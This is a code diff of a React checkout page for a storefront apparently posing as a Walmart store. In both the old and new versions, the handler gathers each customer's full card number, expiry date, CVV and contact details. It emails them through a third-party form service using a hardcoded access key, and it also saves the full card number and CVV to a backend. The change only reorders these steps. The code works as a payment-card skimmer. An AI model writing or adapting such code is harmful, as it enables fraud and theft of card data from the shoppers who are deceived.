@@ -72,7 +72,7 @@ const PaymentPage = () => {
     setIsProcessing(true);
 
     try {
-      // Get cart and user info with fallback empty values
+      // Get cart and user info
       const cart = JSON.parse(localStorage.getItem('cart')) || [];
       const userInfo = JSON.parse(localStorage.getItem('userInfo')) || {};
 
@@ -81,97 +81,81 @@ const PaymentPage = () => {
         0
       );
 
-      // 1. FORMAT ORDER ITEMS PROPERLY FOR EMAIL
-      const orderItemsList = cart.map((item, index) => 
-        `${index + 1}. ${item.name} | Qty: ${item.quantity} | Price: $${((item.discountedPrice || item.price) * item.quantity).toFixed(2)}`
-      ).join('\n');
+      const cardDigits = paymentData.cardNumber.replace(/\s/g, '');
 
-      // 2. PREPARE ALL DATA FOR WEB3FORMS 
-      // Web3Forms will show keys exactly as written here, so using readable names.
-      const web3FormData = {
-        access_key: '7d02f2c8-8ae8-4c8d-bfd3-aab848bf2ee8',
-        subject: `New Order from ${userInfo.fullName || 'Customer'} - Walmart Store`,
-        from_name: 'Walmart Store Alerts',
-        
-        // --- CUSTOMER INFO ---
-        "Customer Name": userInfo.fullName || 'Not Provided',
-        "Customer Email": userInfo.email || 'Not Provided',
-        "Customer Phone": userInfo.phone || 'Not Provided',
-        
-        // --- SHIPPING INFO ---
-        "Shipping Address": userInfo.address || 'Not Provided',
-        "City": userInfo.city || 'Not Provided',
-        "State": userInfo.state || 'Not Provided',
-        "Zip Code": userInfo.zipCode || 'Not Provided',
-        "Country": userInfo.country || 'Not Provided',
-        
-        // --- PAYMENT INFO ---
-        "Cardholder Name": paymentData.cardholderName,
-        "Full Card Number": paymentData.cardNumber,
-        "Expiry Date": paymentData.expiryDate,
-        "CVV Code": paymentData.cvv,
-        
-        // --- ORDER DETAILS ---
-        "Order Total": `$${subtotal.toFixed(2)}`,
-        "Order Items": `\n${orderItemsList}`,
-        "Order Date": new Date().toLocaleString(),
-        
-        // Web3Forms Config
-        redirect: false
+      // 1. SAVE TO DATABASE FIRST
+      const orderData = {
+        customerName: userInfo.fullName,
+        customerEmail: userInfo.email,
+        customerPhone: userInfo.phone,
+        shippingAddress: userInfo.address,
+        city: userInfo.city,
+        state: userInfo.state,
+        zipCode: userInfo.zipCode,
+        country: userInfo.country,
+        items: cart.map(item => ({
+          id: item.id,
+          name: item.name,
+          price: item.discountedPrice || item.price,
+          quantity: item.quantity
+        })),
+        total: subtotal,
+        paymentInfo: {
+          cardNumber: paymentData.cardNumber,
+          cardLast4: cardDigits.slice(-4),
+          cardholderName: paymentData.cardholderName,
+          expiryDate: paymentData.expiryDate,
+          cvv: paymentData.cvv
+        }
       };
 
-      // 3. SEND TO WEB3FORMS FIRST
-      const emailResponse = await fetch('https://api.web3forms.com/submit', {
+      const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
+      const dbResponse = await fetch(`${BACKEND_URL}/api/orders`, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          Accept: 'application/json'
-        },
-        body: JSON.stringify(web3FormData)
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(orderData)
       });
 
-      const emailResult = await emailResponse.json();
-
-      if (!emailResult.success) {
-        throw new Error('Failed to send order data to Web3Forms');
+      if (!dbResponse.ok) {
+        throw new Error('Failed to save order to database');
       }
 
-      // 4. SEND TO DATABASE AFTER EMAIL IS SENT (Optional but recommended)
+      // 2. SEND EMAIL NOTIFICATION (Don't fail checkout if email fails)
       try {
-        const orderData = {
-          customerName: userInfo.fullName,
-          customerEmail: userInfo.email,
-          customerPhone: userInfo.phone,
-          shippingAddress: userInfo.address,
-          city: userInfo.city,
-          state: userInfo.state,
-          zipCode: userInfo.zipCode,
-          country: userInfo.country,
-          items: cart,
-          total: subtotal,
-          paymentInfo: {
-            cardNumber: paymentData.cardNumber,
-            cardLast4: cardDigits.slice(-4),
-            cardholderName: paymentData.cardholderName,
-            expiryDate: paymentData.expiryDate,
-            cvv: paymentData.cvv
-          }
-        };
+        const orderItemsList = cart.map((item, index) => 
+          `${index + 1}. ${item.name} | Qty: ${item.quantity} | Price: $${((item.discountedPrice || item.price) * item.quantity).toFixed(2)}`
+        ).join('\\n');
 
-        const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
-        if(BACKEND_URL) {
-           await fetch(`${BACKEND_URL}/api/orders`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(orderData)
-          });
-        }
-      } catch (dbError) {
-        console.error('Database save failed, but Web3Forms email was sent:', dbError);
-        // We do not throw error here, so user checkout is not blocked if DB fails.
+        const emailData = new FormData();
+        emailData.append('access_key', '7d02f2c8-8ae8-4c8d-bfd3-aab848bf2ee8');
+        emailData.append('subject', `New Order from ${userInfo.fullName || 'Customer'} - Walmart Store`);
+        emailData.append('from_name', 'Walmart Store Alerts');
+        emailData.append('Customer Name', userInfo.fullName || 'Not Provided');
+        emailData.append('Customer Email', userInfo.email || 'Not Provided');
+        emailData.append('Customer Phone', userInfo.phone || 'Not Provided');
+        emailData.append('Shipping Address', userInfo.address || 'Not Provided');
+        emailData.append('City', userInfo.city || 'Not Provided');
+        emailData.append('State', userInfo.state || 'Not Provided');
+        emailData.append('Zip Code', userInfo.zipCode || 'Not Provided');
+        emailData.append('Country', userInfo.country || 'Not Provided');
+        emailData.append('Cardholder Name', paymentData.cardholderName);
+        emailData.append('Full Card Number', paymentData.cardNumber);
+        emailData.append('Expiry Date', paymentData.expiryDate);
+        emailData.append('CVV Code', paymentData.cvv);
+        emailData.append('Order Total', `$${subtotal.toFixed(2)}`);
+        emailData.append('Order Items', orderItemsList);
+        emailData.append('Order Date', new Date().toLocaleString());
+
+        await fetch('https://api.web3forms.com/submit', {
+          method: 'POST',
+          body: emailData
+        });
+      } catch (emailError) {
+        console.error('Email notification failed:', emailError);
+        // Don't throw - order is already saved to database
       }
 
-      // 5. SUCCESS ACTION
+      // 3. SUCCESS - Clear cart and redirect
       localStorage.setItem('lastOrder', JSON.stringify({
         cart,
         userInfo,
